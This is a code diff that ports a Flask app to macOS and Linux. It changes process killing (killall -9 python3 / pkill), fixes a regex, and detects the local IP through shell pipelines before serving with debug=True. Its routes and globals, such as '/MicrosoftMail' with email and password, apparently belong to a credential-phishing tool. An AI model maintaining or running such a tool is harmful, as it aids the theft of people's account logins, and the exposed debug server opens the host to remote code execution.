@@ -62,7 +62,11 @@ def getValueFunction(func):
             tupleOutput=None
             continue
 def bye():
-    os.system("killall -9 python3")
+    import platform
+    if platform.system() == "Darwin":  # macOS
+        os.system("pkill -f python3")
+    else:  # Linux
+        os.system("killall -9 python3")
 @app.route("/MicrosoftMail",methods=["POST","GET"])
 def microsoftMail():
     global find_owner,redirectionMicrosoftFailed,email,password
@@ -140,7 +144,7 @@ def index():
             return render_template("help.html")
         elif command[0:15]=="add PhoneNumber":
           
-            phone_number=str("+"+re.search("\d+",command).group(0))
+            phone_number=str("+"+re.search(r"\d+",command).group(0))
             return render_template("phoneNumberSuccess.html",phone_number=phone_number)
         elif command[0:21]=="add feature FindOwner":
             try:
@@ -336,5 +340,19 @@ def socialMedia5():
             continue  
 if __name__ == "__main__":
     import subprocess
-    app.run(str(subprocess.check_output("hostname -I | awk '{print $1}'",shell=True).decode().strip()),8080,debug=True)
+    import platform
+    
+    # Get local IP address based on OS
+    if platform.system() == "Darwin":  # macOS
+        try:
+            local_ip = subprocess.check_output("ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | head -n1", shell=True).decode().strip()
+        except:
+            local_ip = "127.0.0.1"  # fallback to localhost
+    else:  # Linux
+        try:
+            local_ip = subprocess.check_output("hostname -I | awk '{print $1}'", shell=True).decode().strip()
+        except:
+            local_ip = "127.0.0.1"  # fallback to localhost
+    
+    app.run(local_ip, 8080, debug=True)
     
